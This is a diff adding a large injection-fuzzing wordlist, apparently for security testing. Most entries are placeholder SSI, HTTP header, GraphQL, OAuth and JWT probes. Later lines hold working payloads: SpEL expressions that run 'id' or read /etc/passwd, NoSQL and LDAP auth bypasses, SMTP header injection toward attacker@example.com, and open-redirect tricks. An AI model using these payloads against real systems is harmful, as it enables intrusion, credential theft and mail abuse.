+<%='INJECT'%>  /* jsp/erb placeholder */
+<%= 7*7 %>  /* jsp eval placeholder */
+${7+7}  /* shell-template placeholder */
+%{7+7}  /* format placeholder */
+-- # comment-style
+/* multi-line comment start
+   INJECT
+*/
+' or regexp_like(username, '.*') --
+" or regexp_like(username, ".*") --
+$IFS$'\n'  /* shell IFS test placeholder */
+$(echo INJECT)  /* command substitution placeholder */
+; sleep 0; echo INJECT;  /* safe: sleep zero */
+| grep INJECT |  /* pipe-testing placeholder */
+&& echo INJECT &&  /* logical AND placeholder */
+|| echo INJECT ||  /* logical OR placeholder */
+;true;  /* command separator placeholder */
+`perl -e 'print "INJECT\n"'`  /* placeholder */
+${(@)INJECT}  /* zsh/array placeholder */
+; printf 'INJECT\n';  /* safe placeholder */
+`curl http://INJECT`  /* replaced dangerous target with INJECT placeholder */
+`wget http://INJECT`  /* placeholder */
+<!--#exec cmd="INJECT"-->  /* SSI exec placeholder */
+${eval:INJECT}  /* made-up eval style placeholder */
+(%2F%2E%2E%2F)  /* encoded traversal */
+\uxxxx\uyyyy  /* unicode escape test */
+«»‹›“”‘’  /* various quotes/unicode punctuation */
+"半角ｶﾅ全角ひらがな漢字"  /* unicode bidi / multibyte */
+'");/*\nINJECT\n/*"'  /* nested comment-blend test */
+<!--#echo var="INJECT" -->
+<!--#echo var='INJECT' -->
+<!--#echo var=INJECT -->
+<!--#exec cmd="CMD_ECHO" -->
+<!--#exec cmd='CMD_ECHO' -->
+<!--#exec cmd=CMD_ECHO -->
+<!--#include virtual="/path/to/INJECT" -->
+<!--#include virtual='\x2fpath\x2fto\x2fINJECT' -->
+<!--#include file="localfile.html" -->
+<!--#include file=../etc/passwd -->
+<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->
+<!--#printenv -->
+<!--#fsize file="file.txt" -->
+<!--#flastmod file="file.txt" -->
+<!--#errmsg -->
+<!--#if expr="$HOME = '/root'" --><!--#echo var="INJECT" --><!--#endif -->
+<!--#if expr="1 = 1" --><!--#echo var="INJECT"--><!--#endif -->
+<!--#if expr="1 eq 1"--><!--#echo var=INJECT--><!--#endif-->
+<!--#set var="X" value="INJECT" -->
+<!--#set var=X value=INJECT -->
+<!--#echo var="X" -->
+<!--#include virtual="/%2e%2e/%2e%2e/etc/INJECT" -->
+<!--#include virtual="/path/with space/INJECT" -->
+<!--#include virtual="\u002e\u002e/INJECT" -->
+<!--#exec cmd="CMD_ECHO; echo HARMLESS" -->
+<!--#exec cmd="CMD_ECHO && echo INJECT" -->
+<!--#exec cmd="echo $USER || true" -->
+<!--#exec cmd="printf INJECT" -->
+<!--#include virtual="/includes/../../INJECT" -->
+<!--#include file="." -->
+<!--#include file="" -->
+<!--#include virtual=INJECT -->
+<!--#exec cmd=INJECT -->
+<!--#echo var="HTTP_USER_AGENT" -->
+<!--#echo var="REMOTE_ADDR" -->
+<!--#echo var="QUERY_STRING" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="REQUEST_METHOD" -->
+<!--#echo var="PATH_INFO" -->
+<!--#echo var="SCRIPT_NAME" -->
+<!--#echo var="AUTH_TYPE" -->
+<!--#if expr="$REMOTE_ADDR = '127.0.0.1'" --><!--#echo var="INJECT" --><!--#endif -->
+<!--#if expr="string-length(\"INJECT\") > 0" --><!--#echo var="INJECT"--><!--#endif -->
+<!--#if expr="1 = 0" --><!--#echo var=\"NO\" --><!--#elif expr=\"1 = 1\" --><!--#echo var=\"INJECT\" --><!--#endif -->
+<!--#set var="PATH" value="/tmp/INJECT" --><!--#echo var="PATH" -->
+<!--#printenv var="PATH" -->
+<!--#printenv var="SHELL" -->
+<!--#echo var="ENV_VAR_NOT_SET" -->
+<!--#config errmsg="Custom error: INJECT" -->
+<!--#config errmsg=INJECT -->
+<!--#echo var="INJECT" --><!-- unclosed -->
+<!--#echo var="INJECT" --!> 
+<! --#echo var="INJECT" -->
+<!--#echo var="INJECT"-->
+<!--#echo    var="INJECT"    -->
+<!--#ECHO var="INJECT" -->
+<!--#Echo var="INJECT" -->
+<!--#include virtual="/path/..\\..\\INJECT" -->
+<!--#include file="C:\Windows\INJECT" -->
+<!--#include file="../../../../INJECT" -->
+<!--#exec cmd="%00CMD_ECHO" -->
+<!--#exec cmd="%0aCMD_ECHO" -->
+<!--#exec cmd="%0d%0aBcc: attacker@example.com" -->
+<!--#exec cmd="`CMD_ECHO`" -->
+<!--#exec cmd="$(CMD_ECHO)" -->
+<!--#exec cmd="CMD_ECHO > /dev/null" -->
+<!--#exec cmd="CMD_ECHO 2>&1" -->
+<!--#include virtual="/dynamic?file=INJECT" -->
+<!--#include virtual="/dynamic?file=..%2f..%2fINJECT" -->
+<!--#include virtual="/%3c%21--%23include%20virtual%3d%22INJECT%22%20--%3e" -->
+<!--#echo var="INJECT" --><!--#include virtual="/injected" -->
+<!--#if expr="true()" --><!--#include virtual=\"/included\" --><!--#endif -->
+<!--#if expr='contains("INJECT","IN")' --><!--#echo var="INJECT"--><!--#endif -->
+<!--#set var="A" value="1" --><!--#if expr="$A = 1" --><!--#echo var="INJECT"--><!--#endif -->
+<!--#echo var="INJECT" --><!-- malformed -->
+<!--#echo var="INJECT" --><!--#echo var="ANOTHER" -->
+<!--#include virtual="/includes/long-name-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" -->
+<!--#include virtual="/includes/测试/INJECT" -->
+<!--#include virtual="/includes/emoji-😀/INJECT" -->
+<!--#include virtual="/includes/%20space/INJECT" -->
+<!--#exec cmd="CMD_ECHO" --><!-- extra text -->
+INJECT
+INJECT\n
+INJECT\r\n
+INJECT\tVALUE
+INJECT "QUOTE"
+INJECT 'QUOTE'
+INJECT ;;
+INJECT ##
+INJECT %%
+INJECT \\n
+INJECT \\r\\n
+INJECT [brackets]
+INJECT {curly}
+INJECT (paren)
+INJECT </log>
+INJECT <!-- comment -->
+INJECT -- dash --
+INJECT ****
+INJECT ☺ unicode
+INJECT 🌀 emoji
+INJECT ⚠ test-warning
+INJECT log:entry
+INJECT ::separator
+INJECT ::::
+INJECT """ triple
+INJECT ''' triple
+INJECT $$$
+INJECT @@@
+INJECT ###TEST###
+INJECT ===TEST===
+INJECT ????
+INJECT !!!!TEST
+INJECT ////slashes
+INJECT \\\\slashes
+INJECT | pipe |
+INJECT & amp
+INJECT _underscore_
+INJECT ^caret^
+INJECT ~tilde~
+INJECT ENDLOG
+INJECT STARTLOG
+INJECT 0xDEADBEEF
+INJECT UTF8-测试
+INJECT UTF8-テスト
+INJECT UTF8-اختبار
+INJECT ◀︎control▶︎
+INJECT \u0000 null
+INJECT %0A newline encoded
+INJECT %0D carriage encoded
+INJECT %09 tab encoded
+INJECT %20 space encoded
+INJECT long-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+INJECT json {"a":"b"}
+INJECT xml <x>y</x>
+INJECT sql-like SELECT 1
+INJECT js-like alert(1)
+INJECT path ../../test
+INJECT ///absolute
+INJECT ..\..\windows
+INJECT %2e%2e%2f
+INJECT invalid-∞
+INJECT invalid-NaN
+INJECT |WARN| text
+INJECT |DEBUG| text
+INJECT |INFO| text
+INJECT—notelog—
+INJECT:meta:value
+INJECT;meta;value
+INJECT newline
+INJECT multi line
+INJECT"mix'quotes
+INJECT 'mix"quotes
+INJECT ::::END
+X-Test: INJECT
+Cache-Control: none
+Cache-Control: no-store
+Cache-Control: max-age=0
+Cache-Control: max-age=999999
+Cache-Control: public
+Cache-Control: private
+Cache-Control: no-cache
+ETag: "INJECT"
+ETag: W/"INJECT"
+If-None-Match: *
+If-None-Match: "INJECT"
+If-Match: "INJECT"
+If-Modified-Since: Fri, 01 Jan 1990 00:00:00 GMT
+If-Modified-Since: Fri, 01 Jan 3000 00:00:00 GMT
+Vary: *
+Vary: User-Agent
+Vary: Accept-Encoding
+Vary: X-Test
+X-Forwarded-Proto: http
+X-Forwarded-Proto: https
+X-Forwarded-Host: test.local
+X-Forwarded-Host: INJECT.local
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 255.255.255.255
+X-Forwarded-For: INJECT
+X-Cache-Key: INJECT
+X-Cache-Key: ../../INJECT
+X-Cache-Key: %2e%2e%2fINJECT
+Accept-Encoding: gzip
+Accept-Encoding: deflate
+Accept-Encoding: br
+Accept-Encoding: *
+Accept-Language: en-INJECT
+Accept-Language: en,si;q=0.9
+Accept-Language: *
+Origin: https://INJECT
+Origin: null
+Referer: http://test/INJECT
+Pragma: no-cache
+Host: example.com
+Host: INJECT.com
+Host: invalid..com
+Host: %00example.com
+Host: test:80
+Host: test:443
+Forwarded: for=INJECT
+Forwarded: host=INJECT
+Forwarded: proto=INJECT
+Range: bytes=0-
+Range: bytes=0-999999
+Range: bytes=INJECT
+Content-Length: 0
+Content-MD5: INJECT
+Custom-Foo: AAAAAAAA
+Custom-Bar: %20%20%20
+Custom-Key: ********
+Prefetch: on
+TE: chunked
+TE: identity
+Transfer-Encoding: chunked
+Transfer-Encoding: CHUNKED
+Transfer-Encoding: chunked, chunked
+Transfer-Encoding: gzip
+Transfer-Encoding: identity
+Content-Length: 0
+Content-Length: 1
+Content-Length: 999999
+Content-Length: -1
+Content-Length: INJECT
+Content-Length: 0000123
+Content-Length: 0000000
+Content-Length: a
+CL: 10
+CL: INJECT
+CE: gzip
+CE: br
+TE: xxxxx
+Transfer-Encoding: %20chunked
+Transfer-Encoding: chunked%0d%0a
+Transfer-Encoding: \nchunked
+Transfer-Encoding: \rchunked
+Transfer-Encoding: chunked\r\n
+Transfer-Encoding: chunked\n
+X-Ignore: INJECT
+X-Body-Test: AAAAAA
+body: aaaaaaa
+0\r\n\r\n
+0\n\n
+1\r\nA
+1\nA
+999\r\nA
+INJECTBODY
+AAAAAAA
+BBBBBBB
+CCCCCCC
+\r\r
+\n\n
+\r\n\n
+\n\r\n
+Mixed-Header: value
+Header:Value
+Header:  Value
+Header:Value Value
+Header: 
+: empty
+: value
+{ test }
+{ INJECT }
+{ user(id:"INJECT") }
+{ user(name:"INJECT") }
+{ search(q:"INJECT") }
+{ node(id:"INJECT"){id} }
+{ viewer { id } }
+{ __typename }
+{ __schema { queryType { name } } }
+{ __type(name:"User"){name} }
+{ list(limit:0) }
+{ list(limit:-1) }
+{ list(limit:999999) }
+{ list(offset:999999) }
+{ list(filter:"") }
+{ list(filter:"   ") }
+{ list(filter:"☠") }
+{ list(filter:"测试") }
+{ list(filter:"😀") }
+{ user(id:null) }
+{ user(id:true) }
+{ user(id:false) }
+{ user(id:[]) }
+{ user(id:{}) }
+{ user(id:"\n") }
+{ user(id:"\t") }
+{ user(id:"\r") }
+{ user(id:"\\" ) }
+{ user(id:"%00") }
+{ user(id:"%2e") }
+{ user(id:"%20") }
+mutation{update(id:"INJECT",value:"TEST")}
+mutation{delete(id:"INJECT")}
+mutation{create(value:"INJECT")}
+query{a:b}
+query{a:b,c:d}
+query{unicode:"测试"}
+query{emoji:"😀"}
+query{path:"../../INJECT"}
+query{json:"{\"x\":\"y\"}"}
+query{xml:"<x>y</x>"}
+query{arr:[1,2,3]}
+query{arr:["a","b","INJECT"]}
+query{map:{a:"b"}}
+subscription { live }
+subscription { live(id:"INJECT") }
+{user(id:"AAAAA")}
+{user(id:"BBBBB")}
+{user(id:"%%%%%")}
+{user(id:";;;;;")}
+{user(id:"-----")}
+{user(id:"#####")}
+{user(id:"*****")}
+{user(id:"/////")}
+{user(id:"\\\\\\")}
+{user(id:"[[[[[") }
+{user(id:"]]]]]") }
+response_type=INJECT
+response_type=code
+response_type=token
+client_id=INJECT
+client_id=aaaaaaa
+redirect_uri=INJECT
+redirect_uri=https://test/INJECT
+redirect_uri=http://localhost
+redirect_uri=urn:ietf:wg:oauth:2.0:oob
+scope=INJECT
+scope=openid
+scope=profile email
+scope=profile%20email
+state=INJECT
+state=aaaaaaa
+state=123123123
+state=☠
+state=测试
+state=😀
+nonce=INJECT
+nonce=aaaaaaa
+code=INJECT
+code_challenge=INJECT
+code_challenge_method=S256
+code_verifier=INJECT
+prompt=consent
+prompt=login
+prompt=none
+prompt=INJECT
+access_type=offline
+access_type=online
+hd=INJECT
+login_hint=INJECT
+login_hint=user@test
+max_age=0
+max_age=99999
+claims=INJECT
+claims={"userinfo":{"email":{"essential":true}}}
+ui_locales=si-LK
+ui_locales=en-US
+ui_locales=测试
+request=INJECT
+request_uri=INJECT
+audience=INJECT
+audience=https://test
+redirect_uri=javascript:INJECT
+redirect_uri=data:text/plain,INJECT
+redirect_uri=/////INJECT
+redirect_uri=\\INJECT
+redirect_uri=//test.com
+redirect_uri=https://test.com/%2e%2e/
+client_id=000000000000
+client_id=FFFFFFFFFFFF
+scope=aaaaaaaaaaaaaa
+scope=read write admin
+display=popup
+HEADER.PAYLOAD.SIGNATURE
+aaaa.bbbb.cccc
+INJECT.bbbb.cccc
+aaaa.INJECT.cccc
+aaaa.bbbb.INJECT
+aaa..ccc
+..ccc
+aaa.. 
+aaa.bbb.
+empty..empty
+aaaa.bbbb
+AAAAA.BBBBB.CCCCC
+test.test.test
+header.payload.signature
+eyJhbGciOiJIUzI1NiJ9.INJECT.signature
+header.{"x":"y"}.signature
+{"alg":"none"}.payload.signature
+eyJhbGciOiJub25lIn0.payload.
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.signature
+eyJhbGciOiJIUzI1NiJ9.e30.
+eyJhbGciOiJIUzI1NiJ9."".
+eyJhbGciOiJIUzI1NiJ9." ".signature
+eyJhbGciOiJIUzI1NiJ9."☠".signature
+eyJhbGciOiJIUzI1NiJ9."🔥".signature
+eyJhbGciOiJIUzI1NiJ9."测试".signature
+eyJhbGciOiJIUzI1NiJ9."😀".signature
+aaa.bbb.%00
+aaa.bbb.%20
+aaa.bbb.%2e%2e
+aaa.bbb.******
+aaa.bbb.%%%%%%
+aaa.bbb.;;;;;;
+aaa.bbb."mix'quotes"
+aaa.bbb.'mix"quotes'
+aaa.bbb.{"nested":{"a":"b"}}
+aaa.bbb.{"arr":[1,2,3]}
+aaa.bbb.{"long":"aaaaaaaaaaaaaaaaaaaa"}
+aaa.bbb.{"num":999999}
+aaa.bbb.{"bool":true}
+aaa.bbb.{"null":null}
+aaa.bbb.{"obj":{}}
+aaa.bbb.{"obj":{"obj":{"obj":"INJECT"}}}
+aaa.bbb.{"weird":"\n\r\t"}
+aaa.bbb.{"escape":"\\u0000"}
+aaa.bbb.{"sym":"∞"}
+aaa.bbb.{"sym":"✔"}
+eyJhbGciOiJIUzI1NiJ9.e30.signature==
+eyJhbGciOiJIUzI1NiJ9.e30.signature%%%%
+eyJhbGciOiJIUzI1NiJ9.e30.signature!!!!
+eyJhbGciOiJIUzI1NiJ9.e30.signature???? 
+eyJhbGciOiJIUzI1NiJ9.e30.signature//// 
+eyJhbGciOiJIUzI1NiJ9.e30.signature\\\\ 
+eyJhbGciOiJIUzI1NiJ9.e30.signature:::: 
+eyJhbGciOiJIUzI1NiJ9.e30.signature---- 
+eyJhbGciOiJIUzI1NiJ9.e30.signature____ 
+eyJhbGciOiJIUzI1NiJ9.e30.signature#### 
+invalid.invalid.invalid
+bad.header.pay
+display=page
+display=INJECT
+grant_type=authorization_code
+grant_type=refresh_token
+grant_type=password
+grant_type=INJECT
+code=AAAAAAA
+code=BBBBBBB
+code=%%%%%%%
+code=;;;;;;;
+code=<<<<<
+code=>>>>>
+code=∞∞∞
+state="mix'quotes"
+state='mix"quotes'
+nonce="\\n"
+nonce="\\t"
+nonce="\\r"
+pkce=INJECT
+session_state=INJECT
+acr_values=INJECT
+acr_values=2
+request_serialized=AAAAAAA
+request_serialized=BBBBBBB
+request_serialized=<<<<<
+{user(id:"{{{{{") }
+{user(id:"}}}}}") }
+{ unicodeField: "∞∞∞" }
+{ escape: "\\u0000" }
+{ num: 0 }
+{ num: -1 }
+{ num: 999999 }
+mutation { set(value:"long-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") }
+mutation { set(value:"" ) }
+mutation { set(value:" ") }
+mutation { set(value:"  ") }
+mutation { set(flag:true)}
+mutation { set(flag:false)}
+mutation { set(list:[1,2,3])}
+mutation { set(obj:{x:1})}
+mutation { set(obj:{})}
+{str:"\"mix'quotes\""}
+{str:"'mix\"quotes'"}
+{weird:"\n\r\t"}
+{symbol:"☠"}
+{symbol:"✔"}
+{symbol:"🔥"}
+{obj:{a:{b:{c:"INJECT"}}}}
+semi;colon:value
+weird:char:here
+space key: value
+snake_case: value
+UTF8-测试: value
+emoji-😀: value
+header-∞: value
+header-NaN: value
+Tab\tHeader: value
+Line\nBreak: value
+Return\rBreak: value
+Encoded:%41:%42
+Malformed%%%:value
+CL: 123\r\nExtra:1
+TE: gzip\r\nExtra:1
+Host: example.com
+Host: Example.COM
+Host: INJECT.local
+Host: 127.0.0.1
+Host: [::1]
+GET /test HTTP/1.1
+POST /test HTTP/1.1
+TRACE / HTTP/1.1
+OPTIONS /test HTTP/1.1
+X-Test:"a"
+X-Test:'a'
+X-Test: aaaaaaaa
+Repeated:1
+Repeated:2
+Weird-Spacing   :    value
+Prefetch: off
+X-Purpose: preview
+X-Purpose: INJECT
+Link: <INJECT>; rel=preload
+Link: </static/js/app.js>; rel=preload
+X-Real-IP: INJECT
+X-Real-IP: 127.0.0.1
+X-Real-IP: 169.254.0.1
+Via: INJECT
+Via: 1.1 test
+Surrogate-Key: INJECT
+Surrogate-Control: max-age=INJECT
+Priority: u=1
+Priority: u=0
+User-Agent: INJECT-TEST
+User-Agent: aaaaaaaaaaaaaa
+User-Agent: <>«»
+User-Agent: ☠INJECT
+Accept: */*
+Accept: text/html
+Accept: application/json
+Accept: INJECT/test
+TE: trailers
+TE: INJECT
+Upgrade-Insecure-Requests: 1
+Upgrade-Insecure-Requests: 0
+Expect: 100-continue
+Expect: INJECT
+INJECT ####END
+INJECT \\, escape
+INJECT ''EMPTY''
+INJECT ""EMPTY""
+INJECT whitespace    
+INJECT    leading
+    INJECT indented
+INJECT[][][][][]
+INJECT<<<>>>
+INJECT<<<TAG>>>
+INJECT ::::::::::
+INJECT \x41\x42
+INJECT key=value
+INJECT key:value
+INJECT key->value
+INJECT user@domain
+INJECT (log)(test)
+INJECT!!!ALERT!!!
+INJECT-FINAL
+INJECT-END
+INJECT-☠-symbol
+INJECT-✔ test
+INJECT random123
+INJECT 00000000123
+INJECT ---EOF---
+INJECT ###EOF###
+<!--#exec cmd="CMD_ECHO" --!> extra
+<!--#exec cmd="CMD_ECHO"-->
+<!--#exec    cmd   =   "CMD_ECHO"    -->
+<!--#exec cmd="CMD_ECHO"  bogus="x" -->
+<!--#include virtual="/path/with?query=1&x=INJECT" -->
+<!--#include virtual="/path/%00INJECT" -->
+<!--#include virtual="/path/%2e%2e/%2e%2e/INJECT" -->
+<!--#exec cmd="CMD_ECHO %s" -->
+<!--#exec cmd="CMD_ECHO %s %s" -->
+<!--#include virtual="/../\../%2e%2e/INJECT" -->
+<!--#echo var="HTTP_COOKIE" -->
+<!--#echo var="HTTP_REFERER" -->
+<!--#echo var="HTTP_COOKIE" --><!--#exec cmd="CMD_ECHO" -->
+<!--#set var="long" value="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -->
+<!--#include virtual="/includes/../../../../../../../../INJECT" -->
+<!--#exec cmd="CMD_ECHO & CMD_ECHO" -->
+<!--#exec cmd="CMD_ECHO | CMD_ECHO" -->
+<!--#exec cmd="CMD_ECHO ; CMD_ECHO" -->
+<!--#exec cmd="CMD_ECHO \n CMD_ECHO" -->
+<!--#exec cmd="CMD_ECHO\x00" -->
+<!--#include virtual="/%0A%0DINJECT" -->
+<!--#echo var="INJECT" --> <!-- trailing -->
+<!--#include virtual="" --><!-- blank include -->
+<!--#exec cmd="" -->
+<!--#set var="X" value="" --><!-- empty set -->
+<!--#if expr="" --><!--#echo var="INJECT" --><!--#endif -->
+<!--#echo var="INJECT" --><!-- nested <!--#echo var="NEST" --> -->
+<!--#include virtual="/includes/../../INJECT?param=1" -->
+<!--#include virtual="/%2e%2e/%2e%2e/%2e%2e/INJECT" -->
+From: "A%0d%0aCc:%20victim@example.com%0d%0a"
+Subject: test\r\nMIME-Version: 1.0
+MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary="abc"
+Content-Type: multipart/mixed; boundary="abc"\r\n--abc\r\n
+--abc\r\nContent-Type: text/plain\r\n\r\nInjected body
+--abc\r\nContent-Disposition: attachment; filename="poc.txt"\r\n\r\npoc
+--abc\r\nContent-Type: text/plain\r\n\r\n.\r\n
+Boundary: ----=_Part_0_12345\r\n
+------=_Part_0_12345\r\nContent-Type: text/plain\r\n\r\n
+Subject: test\r\nX-Alt-Subject: injected
+To: user@example.com\r\nX-Confirm-Reading-To: attacker@example.com
+To: user@example.com\r\nDisposition-Notification-To: attacker@example.com
+Return-Path: <>\r\nReceived: from unknown (HELO evil)
+Envelope-From: attacker@example.com\r\nEnvelope-To: victim@example.com
+MAIL FROM:<attacker@example.com>\r\nRCPT TO:<victim@example.com>\r\nDATA
+MAIL FROM:<attacker@example.com>%0d%0aRCPT TO:<victim@example.com>%0d%0aDATA
+RCPT TO:<victim@example.com>\r\nRCPT TO:<other@example.com>
+DATA\r\nSubject: injected\r\n\r\nHello\r\n.\r\n
+X-Priority: 1\r\nX-MSMail-Priority: High
+X-Originating-IP: [127.0.0.1]\r\n
+List-Unsubscribe: <mailto:unsubscribe@example.com>
+List-Unsubscribe: <http://evil.example.com/unsub>
+ //user[.='' or @disabled='true']
+ //user[not(.='') or @id='1']
+'] | //*[@role='admin']
+"] | //*[@role="admin"]
+'] | //*[contains(@class,'admin')]
+"] | //*[contains(@class,"admin")]
+') or //user[@id=//admin/id] or ('a'='a
+") or //user[@id=//admin/id] or ("a"="a"
+ //user[. = 'admin' or contains(.,'adm') or position()=1]
+ //*[matches(., 'ad.*', 'i')]
+' or count(//user)=count(//user)
+" or count(//user)=count(//user)"
+' or //user[.='x' and not(.='y')]
+" or //*[name()=concat(\"p\",\"w\")]"
+*)(mail=*)
+*))(uid=*)
+*)(objectClass=*)
+*)(&(uid=*))
+*)(&(cn=*))
+*)(&(mail=*))
+a*)(uid=*)
+test*)(cn=*)
+admin*)(mail=*)
+*)(*))
+*)(*))
+)(uid=*)
+)(cn=*)
+)(mail=*)
+*)(|(uid=*))
+*)(|(cn=*))
+*)(|(mail=*))
+*))(|(uid=*))
+*))(|(cn=*))
+*))(|(mail=*))
+)(objectClass=*)
+*))
+*))
+}, { password : /.*/ }
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+/ーgoogle.com
+/ｰgoogle.com
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+<>javascript:alert(1);
+<>//google.com
+//google.com\@www.whitelisteddomain.tld
+https://:@google.com\@www.whitelisteddomain.tld
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+ja\nva\tscript\r:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+http://google.com:80#@www.whitelisteddomain.tld/
+http://google.com:80?@www.whitelisteddomain.tld/
+http://google.com\www.whitelisteddomain.tld
+http://google.com&www.whitelisteddomain.tld
+http:///////////google.com
+\\google.com
+http://www.whitelisteddomain.tld.google.com
+%25250AHeader-Test:BLATRUC
+%%0A0AHeader-Test:BLATRUC
+%25%30AHeader-Test:BLATRUC
+%25%30%61Header-Test:BLATRUC
+%u000AHeader-Test:BLATRUC
+//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC
+/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC
+/google.com/%2F..%0D%0AHeader-Test:BLATRUC
 price=10&price=20
 time=now&time=later
 ref=google&ref=bing
